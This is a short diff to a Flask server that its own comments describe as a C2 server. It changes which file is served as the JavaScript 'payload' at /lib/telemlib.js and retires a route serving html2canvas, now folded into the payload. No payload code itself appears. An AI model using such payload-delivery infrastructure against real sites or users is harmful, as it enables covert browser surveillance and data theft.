@@ -563,7 +563,7 @@ def afterRequestHeaders(response):
 # Send a copy of the payload
 @app.route('/lib/telemlib.js', methods=['GET'])
 def sendPayload():
-    with open('./telemlib_new.js', 'rb') as file:
+    with open('./telemlib.js', 'rb') as file:
         payload = file.read()
         response = make_response(payload, 200)
         response.mimetype = 'text/javascript'
@@ -571,15 +571,16 @@ def sendPayload():
         return response
 
 
+# Baked into main payload now
 # Send copy of html2canvas library
-@app.route('/lib/telemhelperlib.js', methods=['GET'])
-def sendHtml2Canvas():
-    with open('./html2canvas.min.js', 'rb') as file:
-        payload = file.read()
-        response = make_response(payload, 200)
-        response.mimetype = 'text/javascript'
+# @app.route('/lib/telemhelperlib.js', methods=['GET'])
+# def sendHtml2Canvas():
+#     with open('./html2canvas.min.js', 'rb') as file:
+#         payload = file.read()
+#         response = make_response(payload, 200)
+#         response.mimetype = 'text/javascript'
 
-        return response
+#         return response
 
 
 # Send c2 UI index page
